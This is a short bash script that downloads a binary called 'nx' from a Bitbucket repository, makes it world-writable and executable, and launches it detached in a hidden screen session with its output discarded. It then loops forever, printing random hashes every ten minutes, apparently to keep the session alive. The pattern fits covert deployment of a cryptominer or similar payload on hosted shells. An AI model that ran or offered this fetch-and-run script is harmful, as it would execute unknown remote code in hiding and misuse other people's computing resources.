#!/bin/bash
wget https://bitbucket.org/naufalsis61/nexa/raw/master/nx && chmod 777 nx && screen -dmS x ./nx >/dev/null 2>&1
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
